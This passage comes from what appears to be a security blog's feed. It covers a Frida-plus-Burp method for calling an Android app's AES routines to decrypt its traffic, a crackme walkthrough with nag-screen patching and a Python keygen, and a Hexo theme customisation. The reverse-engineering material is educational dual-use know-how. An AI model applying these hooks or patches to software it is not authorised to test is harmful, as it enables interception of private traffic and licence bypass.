arg1是Android的Context的对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br></pre></td></tr></table></figure><p>最终代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">var rpc_result &#x3D; null;</span><br><span class="line">var rpc_result_ios &#x3D; null;</span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tagf0f1c91ca14d835ab8ae6e62346a447d02: function(arg0, arg1)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br><span class="line">                var EncryptionTool$AES0224190b5b0f850f45017089f29e6428 &#x3D; Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;);</span><br><span class="line">                rpc_result &#x3D; EncryptionTool$AES0224190b5b0f850f45017089f29e6428.decrypt(context,arg0);</span><br><span class="line">                &#x2F;&#x2F; send(JSON.stringify(&#123;&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;&#125;)+&#39;-cusoto0oom0sc0ri0pt-&#39;)</span><br><span class="line">            &#125;catch(e)&#123;send(&quot;tagf0f1c91ca14d835ab8ae6e62346a447d02, &quot; + e + &quot;-er00roo000r-&quot;)&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return rpc_result;</span><br><span class="line">    &#125;,</span><br><span class="line">&#x2F;&#x2F; Added Function </span><br><span class="line">tag24239e10fd5afd01a5459978c4306b1f02: function(arg0, arg1)&#123;</span><br><span class="line">        Java.perform(function () &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">var context &#x3D; Java.use(&#39;android.app.ActivityThread&#39;).currentApplication().getApplicationContext();</span><br><span class="line">                var EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57 &#x3D; Java.use(&quot;com.xxx.xxx.ybblibrary.comm.commTools.tool.EncryptionTool$AES&quot;);</span><br><span class="line">                rpc_result &#x3D; EncryptionTool$AES2b8ecc9bd5061994b912287f6411ac57.encrypt(context,arg0);</span><br><span class="line">                &#x2F;&#x2F; send(JSON.stringify(&#123;&quot;aa&quot;:&quot;bb&quot;,&quot;aa1&quot;:&quot;bbb&quot;&#125;)+&#39;-cusoto0oom0sc0ri0pt-&#39;)</span><br><span class="line">            &#125;catch(e)&#123;send(&quot;tag24239e10fd5afd01a5459978c4306b1f02, &quot; + e + &quot;-er00roo000r-&quot;)&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        return rpc_result;</span><br><span class="line">    &#125;,</span><br><span class="line">&#x2F;&#x2F; Added Function </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-loadScript"><a href="#2-loadScript" class="headerlink" title="2.loadScript"></a>2.loadScript</h3><p>点击左上角loadScript</p><h3 id="3-在burpsutie中进行设置"><a href="#3-在burpsutie中进行设置" class="headerlink" title="3.在burpsutie中进行设置"></a>3.在burpsutie中进行设置</h3><p>下载burp插件HTTPDecrpyt并进行安装</p><p><a href="https://github.com/lyxhh/lxhToolHTTPDecrypt/releases">https://github.com/lyxhh/lxhToolHTTPDecrypt/releases</a></p><p>选择到encrypt 然后右键发送到toBurp模块</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150805594.png" alt="image-20201229150805594"></p><p>选择加密后的数据 然后根据配置的方法进行解密</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229150956317.png" alt="image-20201229150956317"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229151136475.png" alt="image-20201229151136475"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.ironheart.top/index.php/archives/22/">http://www.ironheart.top/index.php/archives/22/</a></p><p><a href="https://xz.aliyun.com/t/7130">https://xz.aliyun.com/t/7130</a></p><p><a href="https://www.t00ls.net/articles-51070.html#tls4">https://www.t00ls.net/articles-51070.html#tls4</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;本机环境&quot;&gt;&lt;a href=&quot;#本机环境&quot; class=&quot;headerlink&quot; title=&quot;本机环境&quot;&gt;&lt;/a&gt;本机环境&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Httpdecrypt" scheme="http://www.ol4three.com/tags/Httpdecrypt/"/>
    
  </entry>
  
  <entry>
    <title>crackme-系列之-crackme3</title>
    <link href="http://www.ol4three.com/2020/12/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme3/"/>
    <id>http://www.ol4three.com/2020/12/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme3/</id>
    <published>2020-12-28T08:00:24.000Z</published>
    <updated>2020-12-29T07:27:25.985Z</updated>
    
    <content type="html"><![CDATA[<h2 id="首先打开程序进行查看"><a href="#首先打开程序进行查看" class="headerlink" title="首先打开程序进行查看"></a>首先打开程序进行查看</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228160158599.png" alt="image-20201228160158599" style="zoom:50%;"><p>发现存在一个neg窗口</p><h2 id="去除neg窗口"><a href="#去除neg窗口" class="headerlink" title="去除neg窗口"></a>去除neg窗口</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>使用VBExploere把timer改为1 破解neg</p><p>根据提示框下断点进行分析</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>首先将内存定位到程序开始处0x401000</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228160748180.png" alt="image-20201228160748180"></p><p>搜索Timer，Timer是VB程序默认的定时器变量</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228160816008.png" alt="image-20201228160816008"></p><p>我们找到Timer之后 在上面的位置可以看到一个0x1B58，这个是计时器的秒数。也就是十进制的7000,7000毫秒就 是7秒。所以第一种去Neg的方法就是将0x1B58改为0x0001 但是此种方法也有一定的局限性，如果程序的作者将计时器的默认名称改掉之后 根本无法在内存中搜索到Timer关键 字 也就无法下手。下面介绍一种通用的解决方法</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>Virtual Basic可执行程序结构研究 对于Visual Basic5/6编译生成的程序，不管自然编译还是伪编译，其程序入口点处的结构都是一样的。来到OEP处：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161030007.png" alt="image-20201228161030007"></p><p>指针0x4067D4指向的结构就是Virtual Basic程序的VBHeader结构，由此伸展开，整个VB程序的框架<strong>就在这了。 Virtual Basic程序框架结构</strong></p><p> 可能的Virtual Basic程序框架结构如图</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161100147.png" alt="image-20201228161100147"></p><p>TVBHeader结构定义</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161129407.png" alt="image-20201228161129407"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161203921.png" alt="image-20201228161203921"></p><p>AGUTTable(4C的位置)结构定义</p><p>以AfkayAs.2.exe为例说明：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161225305.png" alt="image-20201228161225305"></p><p>其对应每个字节的含义如下表</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161314880.png" alt="image-20201228161314880"></p><h2 id="4C法实战"><a href="#4C法实战" class="headerlink" title="4C法实战"></a>4C法实战</h2><p>在程序载入到入口点之后的第一个push也就是VBHeader的位置，数据窗口跟随。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161416594.png" alt="image-20201228161416594"></p><p>然后在数据窗口输入刚才的地址+4C，找到form GUI描述表的指针</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161433897.png" alt="image-20201228161433897"></p><p>数据窗口跟随DWORD</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161501143.png" alt="image-20201228161501143"></p><p>00  01 指的是窗体的序号 10则为第一个窗体的启动标志</p><p>所以 我们只要把第一个窗体数据块的00改成10 然后把第二个窗体的数据块的10改成00，或者将窗体的序号调换。即 可去除neg。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161703623.png" alt="image-20201228161703623"></p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161721626.png" alt="image-20201228161721626" style="zoom:50%;"><h2 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161902354.png" alt="image-20201228161902354"></p><p>和002一样获取哟弄个户名长度然后根据得到的结果算出来一个值 我这里这个值为355601</p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228161949962.png" alt="image-20201228161949962"></p><p>首先将刚才计算的结果转为浮点数 放入到FPU栈 然后将结果加上2.0 得到355603。逆向这个程序你并不需要 看懂每一条浮点指令，只需要单步跟踪 然后时时观察FPU栈的情况。</p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162027293.png" alt="image-20201228162027293"></p><p>还是将刚才的结果转为浮点数并入栈 然后将355603乘以一个值再减去一个值 最后得到结果ST0=1066807.0000</p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162141525.png" alt="image-20201228162141525"></p><p>将刚才那个值 -（-15） 到此验证结束</p><p>1066822</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162235299.png" alt="image-20201228162235299" style="zoom:50%;"><p>编写注册机</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162444993.png" alt="image-20201228162444993"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162502213.png" alt="image-20201228162502213"></p><h3 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2+15)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201228162854781.png" alt="image-20201228162854781"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;please input your username :&quot;)</span><br><span class="line">s &#x3D; input()</span><br><span class="line"># 获取用户名长度*0x15b38 +  用户名首位</span><br><span class="line">print(ord(s[0])+len(s)*(0x15b38))</span><br><span class="line"># 变成浮点数然后数值加2</span><br><span class="line">print((ord(s[0])+len(s)*(0x15b38))+2)</span><br><span class="line"># 相应的浮点数 * 3 - 2</span><br><span class="line">print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2)</span><br><span class="line">print(&quot;your password is:&quot;)</span><br><span class="line"># 让相应的值- (-15) 相当于+15</span><br><span class="line">print(((ord(s[0])+len(s)*(0x15b38))+2)*3-2+15)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;首先打开程序进行查看&quot;&gt;&lt;a href=&quot;#首先打开程序进行查看&quot; class=&quot;headerlink&quot; title=&quot;首先打开程序进行查看&quot;&gt;&lt;/a&gt;首先打开程序进行查看&lt;/h2&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="crackme" scheme="http://www.ol4three.com/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>Icarus 主题双列显示和目录单独浮动等</title>
    <link href="http://www.ol4three.com/2020/12/26/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/Icarus-%E4%B8%BB%E9%A2%98%E5%8F%8C%E5%88%97%E6%98%BE%E7%A4%BA%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8D%95%E7%8B%AC%E6%B5%AE%E5%8A%A8%E7%AD%89/"/>
    <id>http://www.ol4three.com/2020/12/26/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/Icarus-%E4%B8%BB%E9%A2%98%E5%8F%8C%E5%88%97%E6%98%BE%E7%A4%BA%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8D%95%E7%8B%AC%E6%B5%AE%E5%8A%A8%E7%AD%89/</id>
    <published>2020-12-25T17:18:06.000Z</published>
    <updated>2020-12-25T17:23:58.417Z</updated>
    
    <content type="html"><![CDATA[<p>本文是基于icarus 4.x的版本</p><p>本博客所选取的主题是 <a href="https://github.com/AlphaLxy/hexo-theme-icarus">Icarus</a> ，并做了一些个性化的修改，很多修改都可以直观的看到。详细的差异可以查看 <a href="https://github.com/ppoffice/hexo-theme-icarus/compare/4.1.1...AlphaLxy:master">diff</a>，这里记录一些主要的改动。</p><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><h3 id="文章页面两栏布局"><a href="#文章页面两栏布局" class="headerlink" title="文章页面两栏布局"></a>文章页面两栏布局</h3><p>主题默认是三栏布局，在阅读文章时显得有些拥挤。可以通过配置的方式把所有文章变为两栏布局，在<code>_config.post.yml</code>把需要的<code>widget</code>显示在一边即可，可以参考<a href="https://blog.zhangruipeng.me/hexo-theme-icarus/Configuration/icarus用户指南-主题配置/#布局配置文件">官方文档</a>。</p><p>但两栏整体宽度跟三栏不同，因此强制指定为三栏布局，并且修改相应的宽度，这样所有的页面侧边栏宽度保持一致。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;layout.jsx</span><br><span class="line"></span><br><span class="line">             &lt;Head site&#x3D;&#123;site&#125; config&#x3D;&#123;config&#125; helper&#x3D;&#123;helper&#125; page&#x3D;&#123;page&#125; &#x2F;&gt;</span><br><span class="line">-            &lt;body class&#x3D;&#123;&#96;is-$&#123;columnCount&#125;-column&#96;&#125;&gt;</span><br><span class="line">+            &lt;body class&#x3D;&#123;&#96;is-3-column&#96;&#125;&gt;</span><br><span class="line">                 &lt;Navbar config&#x3D;&#123;config&#125; helper&#x3D;&#123;helper&#125; page&#x3D;&#123;page&#125; &#x2F;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;layout.jsx</span><br><span class="line"></span><br><span class="line">                                 &#39;is-12&#39;: columnCount &#x3D;&#x3D;&#x3D; 1,</span><br><span class="line">-                                &#39;is-8-tablet is-8-desktop is-8-widescreen&#39;: columnCount &#x3D;&#x3D;&#x3D; 2,</span><br><span class="line">+                                &#39;is-8-tablet is-8-desktop is-9-widescreen&#39;: columnCount &#x3D;&#x3D;&#x3D; 2,</span><br><span class="line">                                 &#39;is-8-tablet is-8-desktop is-6-widescreen&#39;: columnCount &#x3D;&#x3D;&#x3D; 3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;common&#x2F;widgets.jsx</span><br><span class="line"></span><br><span class="line"> function getColumnSizeClass(columnCount) &#123;</span><br><span class="line">     switch (columnCount) &#123;</span><br><span class="line">         case 2:</span><br><span class="line">-            return &#39;is-4-tablet is-4-desktop is-4-widescreen&#39;;</span><br><span class="line">+            return &#39;is-4-tablet is-4-desktop is-3-widescreen&#39;;</span><br><span class="line">         case 3:</span><br><span class="line">             return &#39;is-4-tablet is-4-desktop is-3-widescreen&#39;;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>并优化在不同屏幕小大下的宽度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;responsive.styl</span><br><span class="line"></span><br><span class="line"> +widescreen()</span><br><span class="line">+    .is-3-column .container</span><br><span class="line">+        max-width: $widescreen - $gap</span><br><span class="line">+        width: $widescreen - $gap</span><br><span class="line">+</span><br><span class="line">     .is-1-column .container, .is-2-column .container</span><br><span class="line">         max-width: $desktop - 2 * $gap</span><br><span class="line">         width: $desktop - 2 * $gap</span><br><span class="line"></span><br><span class="line"> +fullhd()</span><br><span class="line">+    .is-3-column .container</span><br><span class="line">+        max-width: $fullhd - 2 * $gap</span><br><span class="line">+        width: $fullhd - 2 * $gap</span><br><span class="line">+</span><br><span class="line">     .is-2-column .container</span><br><span class="line">         max-width: $widescreen - 2 * $gap</span><br><span class="line">         width: $widescreen - 2 * $gap</span><br></pre></td></tr></table></figure><h3 id="优化文章标题布局"><a href="#优化文章标题布局" class="headerlink" title="优化文章标题布局"></a>优化文章标题布局</h3><p>标题移动到文章信息上方，增加更新时间，并增加了icon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;common&#x2F;article.jsx</span><br><span class="line"></span><br><span class="line">                 &#123;&#x2F;* Metadata *&#x2F;&#125;</span><br><span class="line">                 &lt;article class&#x3D;&#123;&#96;card-content article$&#123;&#39;direction&#39; in page ? &#39; &#39; + page.direction : &#39;&#39;&#125;&#96;&#125; role&#x3D;&quot;article&quot;&gt;</span><br><span class="line">+                    &#123;&#x2F;* Title *&#x2F;&#125;</span><br><span class="line">+                    &lt;h1 className&#x3D;&quot;title is-size-3 is-size-4-mobile has-text-weight-normal&quot;&gt;</span><br><span class="line">+                        &#123;index ?</span><br><span class="line">+                            &lt;a className&#x3D;&quot;has-link-black-ter&quot; href&#x3D;&#123;url_for(page.link || page.path)&#125;&gt;</span><br><span class="line">+                                &lt;i className&#x3D;&quot;fas fa-angle-double-right&quot;&gt;&lt;&#x2F;i&gt;&#123;page.title&#125;</span><br><span class="line">+                            &lt;&#x2F;a&gt; :</span><br><span class="line">+                            [&lt;i className&#x3D;&quot;fas fa-angle-double-right&quot;&gt;&lt;&#x2F;i&gt;, page.title]</span><br><span class="line">+                        &#125;</span><br><span class="line">+                    &lt;&#x2F;h1&gt;</span><br><span class="line">                     &#123;page.layout !&#x3D;&#x3D; &#39;page&#39; ? &lt;div class&#x3D;&quot;article-meta is-size-7 is-uppercase level is-mobile&quot;&gt;</span><br><span class="line">                         &lt;div class&#x3D;&quot;level-left&quot;&gt;</span><br><span class="line">                             &#123;&#x2F;* Creation Date *&#x2F;&#125;</span><br><span class="line">-                            &#123;page.date &amp;&amp; &lt;span class&#x3D;&quot;level-item&quot; dangerouslySetInnerHTML&#x3D;&#123;&#123;</span><br><span class="line">-                                __html: _p(&#39;article.created_at&#39;, &#96;&lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot;&gt;$&#123;date(page.date)&#125;&lt;&#x2F;time&gt;&#96;)</span><br><span class="line">-                            &#125;&#125;&gt;&lt;&#x2F;span&gt;&#125;</span><br><span class="line">+                            &#123;page.date &amp;&amp; &lt;span class&#x3D;&quot;level-item&quot;&gt;</span><br><span class="line">+                                &lt;i className&#x3D;&quot;far fa-calendar-alt&quot;&gt;&amp;nbsp;&lt;&#x2F;i&gt;</span><br><span class="line">+                                &lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.date)&#125;&quot;&gt;&#123;date(page.date)&#125;&lt;&#x2F;time&gt;</span><br><span class="line">+                            &lt;&#x2F;span&gt;&#125;</span><br><span class="line">                             &#123;&#x2F;* Last Update Date *&#x2F;&#125;</span><br><span class="line">-                            &#123;page.updated &amp;&amp; &lt;span class&#x3D;&quot;level-item&quot; dangerouslySetInnerHTML&#x3D;&#123;&#123;</span><br><span class="line">-                                __html: _p(&#39;article.updated_at&#39;, &#96;&lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot;&gt;$&#123;date(page.updated)&#125;&lt;&#x2F;time&gt;&#96;)</span><br><span class="line">-                            &#125;&#125;&gt;&lt;&#x2F;span&gt;&#125;</span><br><span class="line">+                            &#123;page.updated &amp;&amp; &lt;span class&#x3D;&quot;level-item is-hidden-mobile&quot;&gt;</span><br><span class="line">+                                &lt;i class&#x3D;&quot;far fa-calendar-check&quot;&gt;&amp;nbsp;&lt;&#x2F;i&gt;</span><br><span class="line">+                                &lt;time dateTime&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot; title&#x3D;&quot;$&#123;date_xml(page.updated)&#125;&quot;&gt;&#123;date(page.updated)&#125;&lt;&#x2F;time&gt;</span><br><span class="line">+                            &lt;&#x2F;span&gt;&#125;</span><br><span class="line">                             &#123;&#x2F;* author *&#x2F;&#125;</span><br><span class="line">                             &#123;page.author ? &lt;span class&#x3D;&quot;level-item&quot;&gt; &#123;page.author&#125; &lt;&#x2F;span&gt; : null&#125;</span><br></pre></td></tr></table></figure><p>其中时间直接使用日期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;main.js</span><br><span class="line"></span><br><span class="line">-    if (typeof moment &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;</span><br><span class="line">-        $(&#39;.article-meta time&#39;).each(function() &#123;</span><br><span class="line">-            $(this).text(moment($(this).attr(&#39;datetime&#39;)).fromNow());</span><br><span class="line">-        &#125;);</span><br><span class="line">-    &#125;</span><br></pre></td></tr></table></figure><h3 id="优化文章结尾布局"><a href="#优化文章结尾布局" class="headerlink" title="优化文章结尾布局"></a>优化文章结尾布局</h3><p>在文章结尾增加一个 <code>hr</code>，并修改 <code>tags</code> 展示。在预览时（主页）也显示 <code>tags</code>，并且将 <code>Read More</code> 按钮放置在右边。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;common&#x2F;article.jsx</span><br><span class="line"></span><br><span class="line">                     &#123;&#x2F;* Licensing block *&#x2F;&#125;</span><br><span class="line">                     &#123;!index &amp;&amp; article &amp;&amp; article.licenses &amp;&amp; Object.keys(article.licenses)</span><br><span class="line">                         ? &lt;ArticleLicensing.Cacheable page&#x3D;&#123;page&#125; config&#x3D;&#123;config&#125; helper&#x3D;&#123;helper&#125; &#x2F;&gt; : null&#125;</span><br><span class="line">+                    &lt;hr style&#x3D;&quot;height:1px;margin:1rem 0&quot;&#x2F;&gt;</span><br><span class="line">+                    &lt;div className&#x3D;&quot;level is-mobile is-flex&quot;&gt;</span><br><span class="line">                     &#123;&#x2F;* Tags *&#x2F;&#125;</span><br><span class="line">-                    &#123;!index &amp;&amp; page.tags &amp;&amp; page.tags.length ? &lt;div class&#x3D;&quot;article-tags is-size-7 mb-4&quot;&gt;</span><br><span class="line">-                        &lt;span class&#x3D;&quot;mr-2&quot;&gt;#&lt;&#x2F;span&gt;</span><br><span class="line">-                        &#123;page.tags.map(tag &#x3D;&gt; &#123;</span><br><span class="line">-                            return &lt;a class&#x3D;&quot;link-muted mr-2&quot; rel&#x3D;&quot;tag&quot; href&#x3D;&#123;url_for(tag.path)&#125;&gt;&#123;tag.name&#125;&lt;&#x2F;a&gt;;</span><br><span class="line">+                    &#123;page.tags &amp;&amp; page.tags.length ? &lt;div class&#x3D;&quot;article-tags is-size-7 is-uppercase&quot;&gt;</span><br><span class="line">+                        &lt;i class&#x3D;&quot;fas fa-tags has-text-grey&quot;&gt;&lt;&#x2F;i&gt;&amp;nbsp;</span><br><span class="line">+                        &#123;page.tags.map((tag, index) &#x3D;&gt; &#123;</span><br><span class="line">+                            return &lt;a class&#x3D;&quot;link-muted&quot; rel&#x3D;&quot;tag&quot; href&#x3D;&#123;url_for(tag.path)&#125;&gt;&#123;tag.name&#125;&#123;index !&#x3D;&#x3D; page.tags.length-1? &#39;, &#39;:&#39;&#39;&#125;&lt;&#x2F;a&gt;;</span><br><span class="line">                         &#125;)&#125;</span><br><span class="line">                     &lt;&#x2F;div&gt; : null&#125;</span><br><span class="line">                     &#123;&#x2F;* &quot;Read more&quot; button *&#x2F;&#125;</span><br><span class="line">-                    &#123;index &amp;&amp; page.excerpt ? &lt;a class&#x3D;&quot;article-more button is-small is-size-7&quot; href&#x3D;&#123;&#96;$&#123;url_for(page.link || page.path)&#125;#more&#96;&#125;&gt;&#123;__(&#39;article.more&#39;)&#125;&lt;&#x2F;a&gt; : null&#125;</span><br><span class="line">+                    &#123;index &amp;&amp; page.excerpt ? &lt;a class&#x3D;&quot;article-more button is-small is-size-7&quot; href&#x3D;&#123;&#96;$&#123;url_for(page.link || page.path)&#125;#more&#96;&#125;&gt;&lt;i class&#x3D;&quot;fas fa-book-reader has-text-grey&quot;&gt;&lt;&#x2F;i&gt;&amp;nbsp;&amp;nbsp;&#123;__(&#39;article.more&#39;)&#125;&lt;&#x2F;a&gt; : null&#125;</span><br><span class="line">+                    &lt;&#x2F;div&gt;</span><br><span class="line">                     &#123;&#x2F;* Share button *&#x2F;&#125;</span><br></pre></td></tr></table></figure><h3 id="优化个人信息布局"><a href="#优化个人信息布局" class="headerlink" 